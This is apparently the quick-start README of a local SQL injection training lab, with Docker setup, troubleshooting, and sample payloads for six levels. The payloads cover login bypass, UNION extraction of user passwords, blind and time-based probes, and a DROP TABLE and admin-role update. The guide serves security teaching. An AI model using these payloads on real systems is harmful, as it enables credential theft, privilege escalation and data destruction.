# SQL Injection Lab - Quick Start Guide

## 🚀 Quick Setup (3 methods)

### Method 1: Docker (Fixed - Recommended)
```bash
# 1. Stop any processes using port 3000
docker-start.bat    # Windows (handles port conflicts automatically)

# OR manually:
docker-compose down
docker-compose up -d --build

# 2. Access the lab
open http://localhost:3000
```

### Method 2: Easy Local Development
```bash
# 1. Start database only
start-lab.bat    # Windows
./setup-db.sh   # Linux/Mac

# 2. Install and run app locally
npm install
npm run dev

# 3. Access the lab
open http://localhost:3000
```

### Method 3: Alternative Ports (if port 3000 conflicts)
```bash
# Uses port 3001 instead of 3000
docker-compose -f docker-compose.alt.yml up -d
# Access at http://localhost:3001
```

## 🛠️ Troubleshooting

### ✅ Docker Port 3000 Error - FIXED!
The previous Docker port conflict has been resolved. The new setup:
- Automatically stops conflicting processes
- Uses proper healthchecks
- Includes restart policies
- Better error handling

### Common Issues:
```bash
# If port still in use:
netstat -ano | findstr :3000
taskkill /PID <PID_NUMBER> /F

# Clean Docker setup:
docker-compose down
docker container prune -f
docker-compose up -d --build

# Alternative port:
docker-compose -f docker-compose.alt.yml up -d
# Access at http://localhost:3001
```

## 🎯 First Steps

1. **Start with Level 1** - Basic string injection
2. **Try this payload**: `' OR '1'='1' --`
3. **Analyze the response** to understand the vulnerability
4. **Progress through levels** as you master each technique

## 🔍 Test Payloads

### Level 1 (Basic String Injection)
```sql
' OR '1'='1' --
' OR 1=1 --
admin' --
```

### Level 2 (Numeric Injection)
```sql
1 OR 1=1
1 UNION SELECT username, password FROM users
```

### Level 3 (Union-based)
```sql
' UNION SELECT username, password, email, role, id FROM users --
' UNION SELECT version(), user(), 3, 4, 5 --
```

### Level 4 (Blind Boolean)
```sql
' AND (SELECT COUNT(*) FROM users) > 0 --
' AND 1=1 --
' AND 1=2 --
```

### Level 5 (Time-based)
```sql
'; SELECT pg_sleep(5) --
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

### Level 6 (Second-order)
```sql
admin'; DROP TABLE users--
test'; UPDATE users SET role='admin'--
```

## 🛡️ Learning Objectives

- ✅ Understand SQL injection fundamentals
- ✅ Master different injection techniques
- ✅ Learn defense strategies
- ✅ Practice ethical hacking skills
- ✅ Recognize real-world vulnerabilities

## ⚠️ Remember
This is for **educational purposes only**. Never test on systems you don't own!

Happy Learning! 🎓
